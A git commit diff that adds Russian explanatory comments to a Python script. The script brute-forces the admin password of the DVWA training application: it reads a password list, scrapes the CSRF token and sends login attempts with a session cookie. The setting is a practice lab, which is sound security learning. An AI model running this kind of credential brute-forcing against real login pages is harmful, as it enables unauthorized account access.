b66637d187aa132b0221eef53ffb5f1c5c33b837
rexik2107 <63393184+rexik2107@users.noreply.github.com>
2022-11-28 17:39:47 +0300

    Update main.py

--- Bruteforce-main/Bruteforce-main/main.py
+++ Bruteforce-main/Bruteforce-main/main.py
@@ -1,13 +1,13 @@
-import requests
-from bs4 import BeautifulSoup as Soup
+import requests # позволяет легко отправлять запросы HTTP
+from bs4 import BeautifulSoup as Soup # библиотека для извлечения данных из файлов HTML и XML
 
-filename = 'passwords.txt'
+filename = 'passwords.txt' # файл с паролями
 success_message = 'Welcome to the password protected area admin'
 txt = open(filename)
 url = 'http://dvwa.local/vulnerabilities/brute/index.php'
 
 cookie = {'security': 'high', 'PHPSESSID': 'mlmi3nuh5pboft6bqpraql6aqr'}
-s = requests.Session()
+s = requests.Session() # Объект Session позволяет сохранять определенные параметры между запросами. Он также сохраняет файлы cookie для всех запросов, сделанных из экземпляра Session
 target_page = s.get(url, cookies=cookie)
 
 
@@ -24,12 +24,12 @@ def checkSuccess(html):
 
 page_source = target_page.text
 soup = Soup(page_source, 'html.parser')
-csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
+csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value') # Поиск всех совпадений в строке.
 with open(filename) as f:
     print('Begin...')
     for password in f:
         payload = {'username': 'admin', 'password': password.rstrip('\r\n'), 'Login': 'Login', 'user_token': csrf_token}
-        r = s.get(url, cookies=cookie, params=payload)
+        r = s.get(url, cookies=cookie, params=payload) # отправляет запрос GET на указанный URL-адрес.
         success = checkSuccess(r.text)
         if not success:
             soup = Soup(r.text, 'html.parser')
